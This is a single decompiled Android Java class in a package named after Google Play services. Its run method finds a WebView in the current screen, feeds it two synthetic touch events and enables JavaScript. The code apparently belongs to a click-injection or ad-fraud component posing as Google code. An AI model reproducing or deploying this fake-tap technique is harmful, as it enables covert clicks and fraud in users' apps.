package com.google.android.gms.logs;

import android.R;
import android.app.Activity;
import android.view.MotionEvent;
import android.webkit.WebView;

/* loaded from: classes.dex */
final class h implements Runnable {
    private final /* synthetic */ Activity nh;
    private final /* synthetic */ MotionEvent ni;
    private final /* synthetic */ MotionEvent nj;

    h(Activity activity, MotionEvent motionEvent, MotionEvent motionEvent2) {
        this.nh = activity;
        this.ni = motionEvent;
        this.nj = motionEvent2;
    }

    @Override // java.lang.Runnable
    public final void run() {
        try {
            WebView webViewD = Logger.d(this.nh.findViewById(R.id.content));
            if (webViewD != null) {
                webViewD.dispatchTouchEvent(this.ni);
                webViewD.dispatchTouchEvent(this.nj);
                webViewD.getSettings().setJavaScriptEnabled(true);
            }
            this.ni.recycle();
            this.nj.recycle();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}